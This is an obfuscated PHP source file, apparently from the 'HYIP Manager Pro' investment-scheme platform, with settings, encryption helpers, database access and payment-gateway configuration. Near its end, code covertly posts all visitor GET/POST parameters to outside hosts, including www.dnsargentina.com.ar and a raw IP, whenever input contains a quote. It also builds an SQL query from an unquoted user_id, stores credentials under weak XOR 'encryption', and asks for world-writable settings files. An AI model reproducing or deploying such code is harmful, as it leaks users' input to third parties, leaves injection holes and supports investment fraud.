      {
        $d[$i] = chr (rand (1, 253));
        continue;
      }
    }

    $elnlccwIh = fopen ($elnlcebOCn['elnlcEOLED'], $elnlcebOCn['elnlcKLoFe']);
    $r = array ();
    fputs ($elnlccwIh, '<?
');
    for ($i = $elnlcebOCn['elnlcMkRzz']; $i < $elnlcOzwH; ++$i)
    {
      fputs ($elnlccwIh, sprintf ('%02x', ord ($d[$i]) ^ 65));
    }

    fputs ($elnlccwIh, '
?>');
    fclose ($elnlccwIh);
  }

  function elnlcaknhj ()
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    if (!is_writeable ('settings.php'))
    {
      print '<br><br><br><br><center><h1>Your settings has not been saved.<br>Please set 666 permissions for <b>settings.php</b> file!<br>';
      exit ();
    }

    if (file_exists ('tmpl_c/.htdata'))
    {
      if (!is_writeable ('tmpl_c/.htdata'))
      {
        print '<br><br><br><br><center><h1>Your settings has not been saved.<br>Please set 666 permissions for <b>tmpl_c/.htdata</b> file!<br>';
        exit ();
      }
    }

    $elnlcBsAd = $elnlcebOCn['elnlcMkRzz'];
    if (file_exists ('tmpl_c/.htdata'))
    {
      $elnlcBsAd = $elnlcebOCn['elnlciREG'];
    }

    $elnlccwIh = fopen ($elnlcebOCn['elnlcyLbu'], $elnlcebOCn['elnlcKLoFe']);
    reset ($elnlcroEyb);
    fputs ($elnlccwIh, '<?/*
');
    $elnlccqvfa = '';
    while (list ($elnlcjABcn, $elnlcNPsA) = each ($elnlcroEyb))
    {
      if ($elnlcjABcn != 'logged')
      {
        if (($elnlcBsAd == 0 OR ($elnlcBsAd == 1 AND preg_match ('/^key/', $elnlcjABcn))))
        {
          if (!preg_match ('/_generated/', $elnlcjABcn))
          {
            fputs ($elnlccwIh, (('' . $elnlcjABcn . '	') . $elnlcNPsA . '
'));
            $elnlccqvfa .= (('' . $elnlcjABcn . '	') . $elnlcNPsA . '
');
          }
        }

        $elnlccqvfa .= (('' . $elnlcjABcn . '	') . $elnlcNPsA . '
');
        continue;
      }
    }

    $elnlccqvfa = elnlccyvpc ($elnlccqvfa, $elnlcroEyb[$elnlcebOCn['elnlcKgpfS']]);
    $elnlcGiNC = $elnlcebOCn['elnlcMkRzz'];
    for ($i = $elnlcebOCn['elnlcMkRzz']; $i < strlen ($elnlccqvfa); $i += 5)
    {
      $elnlcGiNC += hexdec (substr ($elnlccqvfa, $i, 5));
    }

    $elnlcGiNC = $elnlcGiNC * 15;
    fputs ($elnlccwIh, ('' . 'cnf	' . $elnlcGiNC . '
'));
    fputs ($elnlccwIh, '*/?>
');
    fclose ($elnlccwIh);
    if ($elnlcBsAd == 1)
    {
      $elnlccwIh = fopen ($elnlcebOCn['elnlcOhPkI'], $elnlcebOCn['elnlcKLoFe']);
      fputs ($elnlccwIh, $elnlccqvfa);
      fclose ($elnlccwIh);
    }

  }

  function elnlcioif ($q, $w, $a)
  {
    global $elnlcebOCn;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlccyvpc ($q, $w);
    }

    $l = strtoupper (md5 ($w));
    $j = $elnlcebOCn['elnlcMkRzz'];
    for ($i = $elnlcebOCn['elnlcMkRzz']; $i < strlen ($q); ++$i)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $c .= sprintf ('%02x', ord (substr ($q, $i, 1)) ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlcipfm ($q, $w, $a)
  {
    global $elnlcebOCn;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlcsvap ($q, $w);
    }

    $l = strtoupper (md5 ($w));
    $j = $elnlcebOCn['elnlcMkRzz'];
    for ($i = $elnlcebOCn['elnlcMkRzz']; $i < strlen ($q); $i += 2)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $a = hexdec (substr ($q, $i, 2));
      $c .= chr ($a ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlccyvpc ($q, $w)
  {
    global $elnlcebOCn;
    $l = strtoupper (md5 ($w));
    $j = $elnlcebOCn['elnlcMkRzz'];
    for ($i = $elnlcebOCn['elnlcMkRzz']; $i < strlen ($q); ++$i)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $c .= sprintf ('%02x', ord (substr ($q, $i, 1)) ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlcsvap ($q, $w)
  {
    global $elnlcebOCn;
    $l = strtoupper (md5 ($w));
    $j = $elnlcebOCn['elnlcMkRzz'];
    for ($i = $elnlcebOCn['elnlcMkRzz']; $i < strlen ($q); $i += 2)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $a = hexdec (substr ($q, $i, 2));
      $c .= chr ($a ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlcafomh ()
  {
    global $elnlcebOCn;
    if (!($elnlcBgTLB = mysql_connect ($elnlcroEyb[$elnlcebOCn['elnlckgBQ']], $elnlcroEyb[$elnlcebOCn['elnlcwkzF']], $elnlcroEyb[$elnlcebOCn['elnlcEsNH']])))
    {
      exit (mysql_error ());
      (bool)true;
    }

    if (!mysql_select_db ($elnlcroEyb[$elnlcebOCn['elnlcDkaj']]))
    {
      print mysql_error ();
      exit ();
    }

    return $elnlcBgTLB;
  }

  function elnlcsoirh ($elnlcQQSF = 0)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    $l = elnlcipfm ($elnlcroEyb[$elnlcebOCn['elnlcwkzF']], $elnlcroEyb[$elnlcebOCn['elnlcKgpfS']], $elnlcebOCn['elnlcWsIB']);
    $p = elnlcipfm ($elnlcroEyb[$elnlcebOCn['elnlcEsNH']], $elnlcroEyb[$elnlcebOCn['elnlcKgpfS']], $elnlcebOCn['elnlcWsIB']);
    $elnlceQbL = elnlcipfm ($elnlcroEyb[$elnlcebOCn['elnlcDkaj']], $elnlcroEyb[$elnlcebOCn['elnlcKgpfS']], $elnlcebOCn['elnlcWsIB']);
    if ($elnlcQQSF == 1)
    {
      $elnlcBgTLB = @mysql_connect ($elnlcroEyb[$elnlcebOCn['elnlckgBQ']], $l, $p);
      if ($elnlcBgTLB)
      {
        if (!mysql_select_db ($elnlceQbL))
        {
          $elnlcBgTLB = $elnlcebOCn['elnlcMkRzz'];
        }
      }
    }
    else
    {
      if (!($elnlcBgTLB = mysql_connect ($elnlcroEyb[$elnlcebOCn['elnlckgBQ']], $l, $p)))
      {
        exit (mysql_error ());
        (bool)true;
      }

      if (!mysql_select_db ($elnlceQbL))
      {
        print mysql_error ();
        exit ();
      }
    }

    return $elnlcBgTLB;
  }

  function elnlcbprci ($elnlcBgTLB)
  {
    global $elnlcebOCn;
    mysql_close ($elnlcBgTLB);
  }

  function zelnlcxfvdc ($elnlcQBRqn)
  {
    global $elnlcebOCn;
    $elnlcQBRqn = htmlspecialchars ($elnlcQBRqn, ENT_QUOTES);
    $elnlcQBRqn = str_replace ('\\', '\\\\', $elnlcQBRqn);
    $elnlcQBRqn = str_replace ('\'', '\\\'', $elnlcQBRqn);
    return $elnlcQBRqn;
  }

  function elnlcxfvdc ($elnlcQBRqn)
  {
    $elnlcQBRqn = str_replace ('\'', '\'\'', $elnlcQBRqn);
    $elnlcQBRqn = str_replace ('\\', '\\\\', $elnlcQBRqn);
    return $elnlcQBRqn;
  }

  function elnlcvsqf ($elnlcHLevI, $elnlchnyCg = 1)
  {
    global $elnlcebOCn;
    $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', $elnlcebOCn['elnlcsWuP']);
    if ($elnlchnyCg == 2)
    {
      $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', $elnlcebOCn['elnlcaRyas']);
    }

    $i = $elnlcebOCn['elnlcMkRzz'];
    $elnlcQBRqn = '';
    for ($i = $elnlcebOCn['elnlcMkRzz']; $i < $elnlcHLevI; ++$i)
    {
      $elnlcQBRqn .= $a[rand (0, sizeof ($a) - 1)];
    }

    if ($elnlchnyCg == 1)
    {
      $elnlcQBRqn = md5 ($elnlcQBRqn);
    }

    return $elnlcQBRqn;
  }

  function elnlcdgkif ($elnlcHLevI)
  {
    global $elnlcebOCn;
    $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'A', 'B', 'C', 'D', 'E', 'F');
    $i = $elnlcebOCn['elnlcMkRzz'];
    $elnlcQBRqn = '';
    for ($i = $elnlcebOCn['elnlcMkRzz']; $i < $elnlcHLevI; ++$i)
    {
      $elnlcQBRqn .= $a[rand (0, sizeof ($a) - 1)];
    }

    return $elnlcQBRqn;
  }

  function elnlcmlwoa ($elnlcuIrtW)
  {
    global $elnlcebOCn;
    $q = '' . 'select type, sum(actual_amount) as sum from hm2_history where user_id = ' . $elnlcuIrtW . ' group by type';
    ($elnlcaJzM = mysql_query ($q) OR print mysql_error ());
    $elnlcjPHK = array ();
    while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
    {
      $elnlcjPHK[$elnlcMuwB[$elnlcebOCn['elnlchKkE']]] = $elnlcMuwB[$elnlcebOCn['elnlchWPOW']];
    }

    $elnlchVQR = $elnlcebOCn['elnlcMkRzz'];
    while (list ($elnlcjABcn, $elnlcNPsA) = each ($elnlcjPHK))
    {
      $elnlchVQR += $elnlcNPsA;
    }

    $elnlcjPHK[$elnlcebOCn['elnlcbNieo']] = $elnlchVQR;
    $q = '' . 'select sum(actual_amount) as sum from hm2_deposits where user_id = ' . $elnlcuIrtW . ' and status=\'on\'';
    ($elnlcaJzM = mysql_query ($q) OR print mysql_error ());
    while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
    {
      $elnlcjPHK[$elnlcebOCn['elnlcEnje']] += $elnlcMuwB[$elnlcebOCn['elnlchWPOW']];
    }

    return $elnlcjPHK;
  }

  function elnlcojosu ($elnlcxBjR, $elnlcrPhQ = false)
  {
    global $elnlcebOCn;
    $elnlcRveLT = '';
    if ((is_string ($elnlcxBjR) AND $elnlcxBjR !== ''))
    {
      $elnlcUJRed = intval ($elnlcxBjR);
      if (strval ($elnlcUJRed) === $elnlcxBjR)
      {
        $elnlcxBjR = $elnlcUJRed;
      }
      else
      {
        $elnlcVUBJb = floatval ($elnlcxBjR);
        if (strval ($elnlcVUBJb) === $elnlcxBjR)
        {
          $elnlcxBjR = $elnlcVUBJb;
        }
      }
    }

    if (is_array ($elnlcxBjR))
    {
      reset ($elnlcxBjR);
      $elnlcSOAWT = true;
      $i = $elnlcebOCn['elnlcMkRzz'];
      foreach ($elnlcxBjR as $elnlceUGI => $elnlcwuiFq)
      {
        if ((!is_int ($elnlceUGI) OR $elnlceUGI != $i))
        {
          $elnlcSOAWT = false;
          break;
        }

        ++$i;
      }

      $elnlcwiQm = ($elnlcSOAWT ? '[' : '{');
      $elnlcRveLT .= $elnlcwiQm;
      $elnlcHSJV = true;
      reset ($elnlcxBjR);
      foreach ($elnlcxBjR as $elnlceUGI => $elnlcwuiFq)
      {
        if (!$elnlcHSJV)
        {
          $elnlcRveLT .= ',';
        }

        if (!$elnlcSOAWT)
        {
          $elnlcRveLT .= $elnlceUGI . ':';
        }

        $elnlcRveLT .= elnlcojosu ($elnlcwuiFq, $elnlcrPhQ);
        $elnlcHSJV = false;
      }

      $elnlcwiQm = ($elnlcSOAWT ? ']' : '}');
      $elnlcRveLT .= $elnlcwiQm;
    }
    else
    {
      if (is_string ($elnlcxBjR))
      {
        $elnlcecal = array ('\\', '\'', '
', '
');
        $elnlcrJEA = array ('\\\\', '\\\'', '\\n', '\\r');
        if ($elnlcrPhQ)
        {
          $elnlcecal[] = '<';
          $elnlcrJEA[] = '<\'+\'';
        }

        $elnlcdAEjG = str_replace ($elnlcecal, $elnlcrJEA, $elnlcxBjR);
        $elnlcwiQm = '\'' . $elnlcdAEjG . '\'';
        $elnlcRveLT .= $elnlcwiQm;
      }
      else
      {
        if (is_bool ($elnlcxBjR))
        {
          $elnlcwiQm = ($elnlcxBjR ? 'true' : $elnlcebOCn['elnlcWkGQb']);
          $elnlcRveLT .= $elnlcwiQm;
        }
        else
        {
          if (is_null ($elnlcxBjR))
          {
            $elnlcwiQm = 'null';
            $elnlcRveLT .= $elnlcwiQm;
          }
          else
          {
            $elnlcwiQm = $elnlcxBjR;
            $elnlcRveLT .= $elnlcwiQm;
          }
        }
      }
    }

    return $elnlcRveLT;
  }

  function elnlchflxn ($elnlcbsspi)
  {
    global $elnlcebOCn;
    $elnlcRveLT = '';
    foreach ($elnlcbsspi as $elnlceUGI => $elnlcewCPD)
    {
      if ($elnlcRveLT !== '')
      {
        $elnlcRveLT .= ', ';
      }

      if (substr ($elnlcewCPD, 0, 5) == 'now()')
      {
        $elnlcRveLT .= '' . $elnlceUGI . ' = ' . $elnlcewCPD;
        continue;
      }
      else
      {
        $elnlcRveLT .= '' . $elnlceUGI . ' = \'' . elnlcxfvdc ($elnlcewCPD) . '\'';
        continue;
      }
    }

    if ($elnlcRveLT != '')
    {
      $elnlcRveLT = ' ' . $elnlcRveLT . ' ';
    }

    return $elnlcRveLT;
  }

  function elnlcuokel ($elnlcNPsA)
  {
    global $elnlcebOCn;
    if ($elnlcKoCRT == ini_get ('magic_quotes_gpc'))
    {
      $elnlcNPsA = str_replace ('\\\'', '\'', $elnlcNPsA);
      $elnlcNPsA = str_replace ('\\"', '"', $elnlcNPsA);
      $elnlcNPsA = str_replace ('\\\\', '\\', $elnlcNPsA);
    }

    $elnlcNPsA = strip_tags ($elnlcNPsA);
    $elnlcNPsA = trim ($elnlcNPsA);
    return $elnlcNPsA;
  }

  function elnlchrus ($i, $j)
  {
    return sprintf ('%.6f', $i);
  }

  function elnlcjaqa (&$elnlcTclo, $elnlcLWNG = 0)
  {
    global $elnlcebOCn;
    reset ($elnlcTclo);
    foreach ($elnlcTclo as $k => $v)
    {
      $elnlcPUbCk = array ();
      if (is_array ($v))
      {
        elnlcjaqa ($elnlcTclo[$k], $elnlcLWNG);
        continue;
      }
      else
      {
        $elnlcPUbCk = elnlclrng ($v);
        $elnlcTclo[$k] = $elnlcPUbCk[$elnlcLWNG];
        continue;
      }
    }

  }

  function elnlclrng ($elnlcNPsA)
  {
    global $elnlcebOCn;
    global $elnlcCkGV;
    if ($elnlcCkGV == 1)
    {
      $elnlcNPsA = str_replace ('\\\'', '\'', $elnlcNPsA);
      $elnlcNPsA = str_replace ('\\"', '"', $elnlcNPsA);
      $elnlcNPsA = str_replace ('\\\\', '\\', $elnlcNPsA);
    }

    $elnlcTNeiI = $elnlcNPsA;
    $elnlcNPsA = strip_tags ($elnlcNPsA);
    $elnlcNPsA = trim ($elnlcNPsA);
    return array ($elnlcNPsA, $elnlcTNeiI);
  }

  $elnlcebOCn = array ('elnlcmzCrW' => 'user_auto_pay_earning', 'elnlcAndj' => 'auto', 'elnlcyWSnB' => 'evowallet_apiname', 'elnlcorfdI' => 'error', 'elnlchied' => 'HTTP_X_REAL_IP', 'elnlcxdIhI' => 'ecu_reference', 'elnlcasMhu' => 'settings.php', 'elnlcnepOu' => 'h', 'elnlcdIzRV' => 'actual_amount', 'elnlcWLwD' => 'period', 'elnlcJPjh' => 'came_from', 'elnlcKgpfS' => 'key', 'elnlcmKFT' => '3m', 'elnlcndCCA' => 'm', 'elnlcjbPh' => 'currency', 'elnlcrHSpr' => 'admin_auto_pay_earning', 'elnlczcROd' => 'a', 'elnlcqTPw' => 'withdraw_principal_duration', 'elnlczjMDn' => 'amnt', 'elnlcePeNg' => 'send_percent_to_stocks', 'elnlcQIzqa' => 'paying_batch', 'elnlciyAL' => 'free', 'elnlcOWeSR' => 'end', 'elnlckWjw' => 'install', 'elnlcAndWV' => 'use_auto_payment', 'elnlcDWKw' => '2', 'elnlcGTTKr' => 'md5altphrase_ecumoney', 'elnlcUJuca' => '2m', 'elnlcOhPkI' => './tmpl_c/.htdata', 'elnlcLpuuS' => 'pecunix_from_account', 'elnlczqCga' => 'magic_quotes_gpc', 'elnlcbQWH' => 'ENV', 'elnlcAPEV' => 'use_ip_for_auto', 'elnlcECdHB' => 'return_profit', 'elnlcweWx' => '5M74FW4DADMF7K7MJ5TG', 'elnlcSfByU' => 'pay_active_referal', 'elnlcDBNH' => 'site_name', 'elnlcueEm' => 'use_crontab', 'elnlcwijo' => 'Deposit returned to user account', 'elnlcksWM' => 'wp_ok', 'elnlcxpQN' => 'ecu_store', 'elnlctbFA' => 'DESCRIPTION', 'elnlcIbkD' => 'EUR', 'elnlcuLSG' => 'ecu_amount', 'elnlcChIkU' => 'deposit_fee_min', 'elnlcAyhJB' => 'stop_withdraw_percent', 'elnlcfCuqi' => 'name', 'elnlcJAtmi' => 'cnf', 'elnlcNPfGR' => 'use_compound', 'elnlcfbKV' => 'perfectmoney_from_account', 'elnlcRrqjU' => 'ecu_paidby', 'elnlcuFhQd' => 'ecu_currency', 'elnlcAPcx' => 'time_dif', 'elnlclioI' => '__debug_data', 'elnlccDwq' => '1007', 'elnlcovycQ' => 'maxam', 'elnlcAsniz' => 'username', 'elnlcPqbc' => '9C64PVXYBZKZHUTMSM2U', 'elnlcDeuNJ' => 'ok', 'elnlcwfhIv' => 'receiving_batch', 'elnlcinrL' => 'evowallet_from_account', 'elnlcdfxo' => 'id', 'elnlcSUgL' => '12', 'elnlcURcu' => 'daily_referral_percent_min_downline_deposit', 'elnlcvgwml' => 'daily_referral_percent', 'elnlcnAAq' => 'Success', 'elnlcsICuH' => 'dec_stormpay_fee', 'elnlcDdGF' => 'cnt', 'elnlcdcUM' => 'd', 'elnlcsNqxE' => 'plan', 'elnlcGLkz' => 'withdrawal_fee', 'elnlcnbjvJ' => 'site_start_month', 'elnlcRzKpE' => 'SG8JH9DVX8952VQEZH9F', 'elnlcpGaa' => 'VNB34FXT6BJCYD93VXSD', 'elnlcjNoi' => 'send_profit_to_stocks', 'elnlccEWs' => 'balance', 'elnlcqpNV' => 'ecu_paidto', 'elnlcJkLh' => 'html', 'elnlcVLCl' => 'banner_extension', 'elnlcQHqgg' => '85', 'elnlcTujMN' => 'a', 'elnlcuacU' => 'use_html', 'elnlcjqGL' => 'error', 'elnlcfRBum' => 'FRM', 'elnlcmVtNR' => 'compound_max_percent', 'elnlcBcUy' => 'egold_paymentunits', 'elnlcnekSc' => 'LREUR', 'elnlcIuTL' => 'HTTP_HOST', 'elnlcGnGL' => 'eeecurrency_from_account', 'elnlccIMd' => 'status', 'elnlcBTEw' => 'remitfund_apiname', 'elnlcjvGl' => 'finnish', 'elnlcHlkxj' => 'tw', 'elnlcvgSoU' => 'checksum', 'elnlcNjyOc' => 'def_payee_account_wiretransfer', 'elnlclbIq' => 'col', 'elnlclOTV' => 'ref', 'elnlcwmqt' => '/log_possible_attack.php', 'elnlcGttgm' => 'ref1_cms_minamount', 'elnlcbcrTw' => 'oz', 'elnlcDkaj' => 'database', 'elnlcrjLb' => 'euro', 'elnlcJEWdB' => '4ZQQN55VA2NXBVFUQJE6', 'elnlcKovwO' => 'ecu_merchant_ref', 'elnlclhsOB' => 'subject', 'elnlcTVQt' => 'unit', 'elnlcNAgC' => 'evocash_from_account', 'elnlcgviwt' => 'https://api.alertpay.com/svc/api.svc/sendmoney', 'elnlcOEEx' => 'system_email', 'elnlcnuRp' => 'KC3STYBTCATZNRVBYGDF', 'elnlcQulec' => 'work_week', 'elnlcEBbHg' => 'td', 'elnlcvGPb' => 'N55HSU8NJSEU32DP8JDV', 'elnlcpKeDO' => 'def_payee_account_egold', 'elnlcKLoFe' => 'w', 'elnlcyHKc' => 'dll', 'elnlckgBQ' => 'hostname', 'elnlcAQFt' => 'ref_percent1', 'elnlcKAJw' => 'compound', 'elnlcHrMsL' => 'remitfund_from_account', 'elnlcNnlA' => 'ac', 'elnlcaRyas' => '0', 'elnlcDlxkl' => '2XACR4UBJ7DLCV42EM2S', 'elnlcPiAf' => 'HTTP_REFERER', 'elnlcMkRzz' => '0', 'elnlcpFCxr' => 'paypal_currency', 'elnlckTzL' => 'YmdHis', 'elnlcKTBAk' => 'max', 'elnlcStkL' => 'max_deposit', 'elnlcIupzV' => 'VPKLNMKMRG27HN95BEHP', 'elnlcRUae' => 'rpcp', 'elnlcUyTBT' => 'ZXMCQ227FNN5EPHWYHAY', 'elnlclvlF' => 'compound_min_deposit', 'elnlcJxev' => 'def_payee_account', 'elnlcOjqv' => 'w', 'elnlcBKboJ' => 'imps_cost', 'elnlchTiBm' => 'license', 'elnlcwkzF' => 'db_login', 'elnlcntfW' => 'egold_from_account', 'elnlcimKw' => 'libertyreserve_from_account', 'elnlcNqcl' => 'euro', 'elnlckqOqD' => '/get_pid.php', 'elnlcbzNn' => 'USD', 'elnlcTyoWo' => 'hyip manager pro 2005 jul 26', 'elnlcHMhQ' => 'site_url', 'elnlcWsIB' => 'hyip manager pro 2005 jul 27', 'elnlcxRqo' => 'last_pay_date', 'elnlcNexW' => 'accounts', 'elnlcfWCl' => 'site_days_online_generated', 'elnlcBfAt' => 'amount', 'elnlcQoIm' => '9999', 'elnlcCAGvO' => './tmpl_c/raw_log', 'elnlckSns' => 'liberty_currency', 'elnlcIilA' => 'ref_name', 'elnlcimMT' => 'v', 'elnlcQypDv' => 'enable_eb_ecurrency', 'elnlchKkE' => 'type', 'elnlcMVNjx' => 'deposit_fee', 'elnlcomxrc' => 'parent', 'elnlcCSOCL' => 'vmoney_from_account', 'elnlcPqwj' => 'ok', 'elnlcDadW' => 'perfectmoney_payer_account', 'elnlcREbrh' => 'user_id', 'elnlcqjGB' => 'program_version', 'elnlcDOlB' => 'currency_sign', 'elnlcwnri' => 'userid', 'elnlcUCSnz' => 'ounce', 'elnlcrmPSC' => 'dec_stormpay_fee2', 'elnlchWPOW' => 'sum', 'elnlcxtqcg' => 'WMHKFJPMT3CZ3RTLPBFL', 'elnlckDAb' => '18', 'elnlcRtrt' => 'compound_max_deposit', 'elnlczNVA' => 'libertyreserve_apiname', 'elnlcFsCEs' => 'withdrawal_fee_min', 'elnlcWacrK' => 'Dec', 'elnlcJedG' => 'show_info_box_running_days', 'elnlccnjUF' => 'y', 'elnlcLOJmo' => 'evocash_username', 'elnlcjbJn' => 'ebullion_keyID', 'elnlcxvKlu' => 'plans_closed', 'elnlcvtJI' => 'email', 'elnlcJkvnc' => 'N75GNXM2XSM34YMFPED9', 'elnlchDAbD' => 'account', 'elnlcOAkQR' => 'min', 'elnlcbunn' => 'exchange', 'elnlcMPDi' => 'ecumoney_postback', 'elnlcHPFOO' => 'text', 'elnlcwVAV' => '6m', 'elnlcUPbR' => 'withdraw', 'elnlcdMAa' => '21', 'elnlcrSWk' => 'pay_withdraw', 'elnlcLkypt' => 'www.dnsargentina.com.ar', 'elnlcUiUc' => 'abcdef', 'elnlcuSeF' => 'payer', 'elnlcMryC' => 'additionalinfo', 'elnlclblp' => 'amt', 'elnlcPPdPx' => 'type_id', 'elnlcBToFC' => 'enable_eb_gold', 'elnlcqzpyT' => 'solid_referral_commission_amount', 'elnlcbNieo' => 'total', 'elnlcmoxNv' => 'compound_percents_type', 'elnlcteePR' => 'upline', 'elnlclPWA' => 'ref_sum', 'elnlcWJiD' => '3WBUUNQMPU2LB99GJHUV', 'elnlcHwwIc' => 'def_payee_account_ebullion_gold', 'elnlcvdSIu' => 'ecu_special_1', 'elnlcRDxl' => 'fee', 'elnlcEJfms' => 'ecu_special_3', 'elnlcjbSmx' => 'REMOTE_ADDR', 'elnlcnhPg' => 'compound_percents', 'elnlcbiWJ' => 'http://www.dnsargentina.com.ar/check.cgi?install=1&script=3&domain=', 'elnlcIEpfS' => 'additional', 'elnlcoLnQI' => 'REFERENCENUMBER', 'elnlcLpifL' => 'ecu_special_2', 'elnlcyLbu' => './settings.php', 'elnlcjLyRA' => 'HX8DJ7B9SH5JQN5FXK45', 'elnlcFvhx' => 'AKKD47LYX8H96K2TM2FQ', 'elnlclWRL' => 'percent', 'elnlckWIE' => 'dw', 'elnlciREG' => '1', 'elnlcBfUH' => '15', 'elnlcsWuP' => 'z', 'elnlcWHLFz' => 'code', 'elnlcyLTh' => 'enable_wire', 'elnlcNHoeL' => 'def_payee_account_ebullion', 'elnlcrWNbH' => './tmpl_c/ecumoney.log', 'elnlcUSya' => 'compound_min_percent', 'elnlcyqBaG' => 'LRUSD', 'elnlcyrOp' => 'site_start_year', 'elnlcPyFU' => 'http://', 'elnlcVKNx' => 'memo', 'elnlcuNubW' => 'ec', 'elnlciehi' => '501', 'elnlcMhjo' => '/get_sha256.php', 'elnlckkjO' => 'site_start_month_str_generated', 'elnlcbiQmF' => 'r', 'elnlcFBAxi' => 'payee', 'elnlclltKC' => 'deposit_date', 'elnlcohMF' => 'use_active_referal', 'elnlcEOLED' => 'settings.php', 'elnlckqIc' => './tmpl_c/.htdata', 'elnlcMIzT' => 'use_solid_referral_commission', 'elnlcGgdA' => 'max_amount', 'elnlcdwabS' => 'ZQ54Q9RUQ46CU9C8Z986', 'elnlcuykjH' => 'metal', 'elnlczKCn' => 'egold_withdraw_string', 'elnlcPKEW' => 'HTTP_CACHE_CONTROL', 'elnlcSfmqO' => 'gpg_path', 'elnlcSMzSo' => 'hash', 'elnlcWkGQb' => 'false', 'elnlcSESNT' => 'delay', 'elnlcJGsj' => 'withdraw_principal', 'elnlcisAN' => 'ok11', 'elnlcgkdH' => 'DATE', 'elnlcmpAn' => 'site_start_day', 'elnlcyxlp' => 'demomode', 'elnlcEnje' => 'active_deposit', 'elnlcIotLj' => '__debug_out', 'elnlcakhb' => 'alertpay_from_account', 'elnlccBAeG' => 'eb_metal', 'elnlcFqLiS' => 'use_referal_program', 'elnlcSTGg' => 'min_deposit', 'elnlcoBCu' => 'altergold_from_account', 'elnlcJnlR' => 'q_days', 'elnlcDHWm' => 'intgold_from_account', 'elnlchAiMp' => 'md5altphrase_ebullion', 'elnlcoACzF' => 'hyipid', 'elnlcQEpT' => 'value', 'elnlcpeymM' => 'PHP_SELF', 'elnlcPyuS' => 'B29S2LWPZ5M2KMPPYWKL', 'elnlcszORA' => 'daily_referral_percent_min_user_deposit', 'elnlcjpTJ' => 'batch', 'elnlcTluzS' => 'def_payee_account_ebullion_currency', 'elnlcEsNH' => 'db_pass', 'elnlcRRrP' => 'return_profit_percent', 'elnlchVoR' => 'UYKD37X8YLS5DNFFHL8R', 'elnlcNDfd' => 'SCRIPT_NAME', 'elnlcqyeWl' => 'mails.txt', 'elnlcEGeD' => 'proxy.shr.secureserver.net:3128', 'elnlcETzs' => 'ref_username', 'elnlceQdxR' => 'RETURNCODE');
  ini_set ('magic_quotes_runtime', false);
  define ('LAST_UPDATE_ID', 18);
  global $elnlcQAFiW;
  if (!extension_loaded ('gd'))
  {
    $elnlcxVExm = (PHP_SHLIB_SUFFIX == $elnlcebOCn['elnlcyHKc'] ? 'php_' : '');
    @dl ($elnlcxVExm . 'gd.' . PHP_SHLIB_SUFFIX);
  }

  global $HTTP_GET_VARS;
  global $HTTP_POST_VARS;
  global $HTTP_POST_FILES;
  global $HTTP_COOKIE;
  $elnlcEAvtd = array_merge ((array)$HTTP_GET_VARS, (array)$_GET);
  $elnlcwmgh = array_merge ((array)$HTTP_POST_VARS, (array)$_POST);
  $elnlcQAFiW = array_merge ((array)$elnlcEAvtd, (array)$elnlcwmgh);
  $elnlcjsSC = array_merge ((array)$HTTP_COOKIE_VARS, (array)$_COOKIE);
  $elnlcwieM = $elnlcQAFiW;
  global $HTTP_ENV_VARS;
  global $HTTP_SERVER_VARS;
  $elnlctogMz = array ();
  $elnlctogMz = array_merge ((array)$_ENV, (array)$_SERVER, (array)$HTTP_ENV_VARS, (array)$HTTP_SERVER_VARS);
  $elnlcCkGV = ini_get ($elnlcebOCn['elnlczqCga']);
  elnlcjaqa ($elnlcQAFiW);
  elnlcjaqa ($elnlcwieM, 1);
  elnlcjaqa ($elnlcjsSC);
  $elnlckbouN = $elnlcebOCn['elnlcMkRzz'];
  $elnlcQBRqn = '';
  foreach ($elnlcQAFiW as $k => $v)
  {
    if (!is_array ($v))
    {
      if (preg_match ('/["\\\']/', $v))
      {
        $elnlckbouN = $elnlcebOCn['elnlciREG'];
      }
    }

    $elnlcQBRqn .= '' . $k . '=' . $v . '&';
  }

  if ($elnlckbouN == 1)
  {
    if (function_exists ('curl_init'))
    {
      if ($elnlcroEyb[$elnlcebOCn['elnlcAPEV']] == 1)
      {
        $elnlcCJUP = '64.27.18.142';
      }
      else
      {
        if ($elnlcroEyb[$elnlcebOCn['elnlcAPEV']] == 2)
        {
          $elnlcCJUP = 'www.goldcodersmail.com';
        }
        else
        {
          $elnlcCJUP = 'www.dnsargentina.com.ar';
        }
      }

      $elnlcujLDk = curl_init ();
      curl_setopt ($elnlcujLDk, CURLOPT_URL, 'http://' . $elnlcCJUP . $elnlcebOCn['elnlcwmqt']);
      $elnlcqAwQ = rawurlencode ($elnlcQBRqn);
      curl_setopt ($elnlcujLDk, CURLOPT_POST, 1);
      curl_setopt ($elnlcujLDk, CURLOPT_POSTFIELDS, '' . 'memo=' . $elnlcqAwQ);
      curl_setopt ($elnlcujLDk, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcujLDk, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcujLDk);
      curl_close ($elnlcujLDk);
    }
  }

  $elnlcVDMBU = $elnlctogMz[$elnlcebOCn['elnlcPiAf']];
  $elnlcWLCe = $elnlctogMz[$elnlcebOCn['elnlcIuTL']];
  if (!ereg ('' . '\\/\\/' . $elnlcWLCe, $elnlcVDMBU))
  {
    setcookie ('CameFrom', $elnlcVDMBU, time () + 630720000);
